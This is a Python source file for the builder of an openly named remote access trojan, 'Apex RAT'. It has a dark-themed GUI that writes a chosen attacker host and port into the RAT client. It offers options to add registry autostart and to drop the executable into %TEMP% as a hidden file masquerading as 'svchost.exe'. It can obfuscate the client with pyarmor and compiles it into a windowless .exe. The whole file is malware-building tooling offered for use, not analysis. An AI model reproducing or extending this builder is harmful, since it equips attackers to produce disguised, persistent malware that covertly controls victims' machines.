import customtkinter as ct
from subprocess import Popen, CREATE_NEW_CONSOLE
from shutil import copy, rmtree
from ctypes import windll, WinDLL #MessageBox
import os

############################################################
#THIS FILE IS PART OF https://github.com/3verlaster/ApexRAT#
#THIS FILE IS PART OF https://github.com/3verlaster/ApexRAT#
#THIS FILE IS PART OF https://github.com/3verlaster/ApexRAT#
############################################################

version = "1.0"

def dllmessage(text, error):
	if error == True:
		try:
			windll.user32.MessageBoxW(0, f"{text}", f"Apex RAT | Builder", 0 | 0x10)
		except:
			pass
	else:
		try:
			windll.user32.MessageBoxW(0, f"{text}", "Apex RAT | Builder: ERROR", 0 | 0x40)
		except:
			pass

ct.set_appearance_mode("dark")
#ct.set_default_color_theme("green") #fuckit

def install_dependencies():
	Popen(r"Builder\b_assets\b_install.bat", creationflags=CREATE_NEW_CONSOLE)


def open_builds_folder():
	path = r"Builder\ready"
	Popen(f"explorer.exe {path}")

def builder():
	compiling_label = ct.CTkLabel(root, text="Compiling in process...", font=compiling_font, text_color="red")
	compiling_label.place(x=35, y=230)
	root.update()

	server_ip_value = host_entry.get()
	server_port_value = port_entry.get()

	source_file_path = "ApexRAT-Client.py"
	target_file_path = "Builder/stub.py"
	target_line_number = 56
	inserted_text = "FloraNovaLumisZephyr()" #call regedit mod. + drop file to %temp% with hiiden att.

	#################################################
	#          copy client .py to stub.py           #
	#################################################
	with open(source_file_path, "r") as source_file:
		source_content = source_file.read()

	with open(target_file_path, "w") as target_file:
		target_file.write(source_content)


	##################################################

	with open(target_file_path, "r") as target_file:
		lines = target_file.readlines()

	lines[58] = f'server_ip = "{server_ip_value}"\n'
	lines[59] = f'server_port = {server_port_value}\n'

	with open(target_file_path, "w") as target_file:
		target_file.writelines(lines)


	if regeditstartup_exedrop_var.get() == "on":
		with open(target_file_path, "r") as target_file:
			lines = target_file.readlines()

		if 1 <= target_line_number <= len(lines):
			lines[target_line_number - 1] = inserted_text + "\n"

			with open(target_file_path, "w") as target_file:
				target_file.writelines(lines)

	file_to_compile = r"Builder\stub.py"
	if obfuscation_var.get() == "on":
		process = Popen(f'pyarmor pack -e" --onefile --noconsole --icon NONE" {file_to_compile}', creationflags=CREATE_NEW_CONSOLE)
	else:
		process = Popen(f'pyinstaller --onefile --noconsole {file_to_compile}', creationflags=CREATE_NEW_CONSOLE)


	process.wait()

	try:
		if os.path.exists("build"):
			rmtree("build")
	except:
		pass

	try:
		if not os.path.exists("Builder/ready"):
			os.makedirs("Builder/ready")
	except:
		pass
	
	try:
		if os.path.exists("dist/stub.exe"):
			copy("dist/stub.exe", "Builder/ready/build.exe")
			os.remove("dist/stub.exe")
		else:
			copy("dist/stub.exe", "Builder/ready/build.exe")
	except:
		pass

	try:
		if os.path.exists("Builder/dist/stub.exe"):
			copy("Builder/dist/stub.exe", "Builder/ready/build.exe")
			os.remove("dist/stub.exe")
		else:
			copy("Builder/dist/stub.exe", "Builder/ready/build.exe")
	except:
		pass
	
	try:
		if os.path.exists("dist"):
			rmtree("dist")
	except:
		pass

	try:
		if os.path.exists("Builder/dist"):
			rmtree("Builder/dist")
	except:
		pass

	try:
		if os.path.exists("stub.spec"):
			os.remove("stub.spec")
	except:
		pass

	compiling_label.destroy()
	root.update()

root = ct.CTk()
root.resizable(False, False)
try:
	root.iconbitmap("Builder/b_assets/apex_builder.ico")
except:
	print("Error at 00001")
	pass
root.title(f"Apex RAT | Builder v{version} | https://github.com/3verlaster")
root.geometry("500x350+200+200")
#####################
#    checkboxes     #
regeditstartup_exedrop_var = ct.StringVar(value="off")
obfuscation_var = ct.StringVar(value="off")
#####################
title_font = ct.CTkFont(family="Arial", size=27, weight='bold')
warning_font = ct.CTkFont(family="Arial", size=12, weight='bold')
compiling_font = ct.CTkFont(family="Arial", size=40, weight='bold')
compile_button_font = ct.CTkFont(family="Arial", size=15, weight='bold')
title_label = ct.CTkLabel(root, text="Apex RAT: Client Builder", font=title_font).place(x=100, y=8)
build_button = ct.CTkButton(root, text="Build", font=compile_button_font, command=builder).place(x=180, y=85)
host_entry = ct.CTkEntry(root, placeholder_text="HOST (example: 127.0.0.1)", width=200)
host_entry.place(x=40, y=50)
host_entry.insert(0, "127.0.0.1")
port_entry = ct.CTkEntry(root, placeholder_text="PORT (example: 5932)")
port_entry.place(x=300, y=50)
port_entry.insert(0, "5932")
open_builds_folder_button = ct.CTkButton(root, text="Open Folder", command=open_builds_folder).place(x=25, y=85)
install_pyinstaller_button = ct.CTkButton(root, text="Install Dependencies", command=install_dependencies).place(x=335, y=85)
checkboxes_frame = ct.CTkFrame(root, width=425)
checkboxes_frame.place(x=40, y=120)
######### ROOT CHECKBOXES ###########
regeditstartup_exedrop_checkbox = ct.CTkCheckBox(checkboxes_frame, text=r'Auto StartUp + Drop .exe to %TEMP% as "svchost.exe"', variable=regeditstartup_exedrop_var, onvalue="on", offvalue="off").place(x=10, y=10)
obfuscation_checkbox = ct.CTkCheckBox(checkboxes_frame, text="Obfuscation (req. lib pyarmor)", variable=obfuscation_var, onvalue="on", offvalue="off").place(x=10, y=40)
compiling_label = ct.CTkLabel(root, text="Compiling in process...", font=compiling_font, text_color="red")
warning_label = ct.CTkLabel(root, text='DO NOT CHANGE ANYTHING IN "ApexRAT-Client.py"', text_color="green", font=warning_font).place(x=185, y=320)
root.mainloop()